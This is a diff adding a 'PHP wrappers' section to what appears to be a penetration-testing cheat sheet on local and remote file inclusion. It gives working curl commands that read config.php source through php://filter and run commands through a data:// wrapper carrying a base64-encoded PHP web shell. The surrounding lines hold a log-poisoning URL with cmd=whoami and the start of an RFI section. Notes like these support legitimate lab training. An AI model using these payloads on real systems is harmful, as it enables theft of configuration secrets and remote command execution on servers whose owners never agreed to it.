@@ -180,6 +180,33 @@ http://10.11.0.xx/
 
 `http://10.11.0.xx/menu.php?file=../../../../../../../var/log/apache2/access.log&cmd=whoami`
 
+
+### PHP wrappers
+
+Use wrappers to bypass filters.
+
+```bash
+
+# lets access LFI and encode the output as base64
+
+curl http://localhost/index.php?page=php://filter/convert.base64-encode/resource=config.php
+
+# decode base64
+
+echo $b64_output | base64 -d
+
+# also possible to achieve RCE
+
+# 1. encode payload 
+
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+# 2. use wrapper
+
+curl "http://localhost/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+```
+
 ## RFI
 
 * create malicious file evil.txt with payload for php or for any other platform
